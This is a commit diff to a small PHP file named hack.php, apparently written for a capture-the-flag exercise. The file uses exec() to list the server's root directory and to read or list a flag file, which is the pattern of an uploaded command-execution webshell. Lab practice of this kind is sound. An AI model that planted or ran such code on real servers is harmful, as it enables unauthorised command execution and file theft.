ffbdaf44ba32c7e811f0ed75c02e72c9809a3962
yeungsinchun <98640709+yeungsinchun@users.noreply.github.com>
2023-09-03 01:04:26 +0800

    Update hack.php

--- hack.php
+++ hack.php
@@ -3,10 +3,10 @@
 // (on a system with the "whoami" executable in the path)
 $output=null;
 $retval=null;
-exec('ls /', $output, $retval);
+exec('ls -l /', $output, $retval);
 print_r($output);
 print($retval);
-exec('cat flag-e3deebb27b56053dd7041cf93d1499f4', $output, $retval);
+exec('ls flag-e3deebb27b56053dd7041cf93d1499f4', $output, $retval);
 print_r($output);
 print($retval);
 ?>
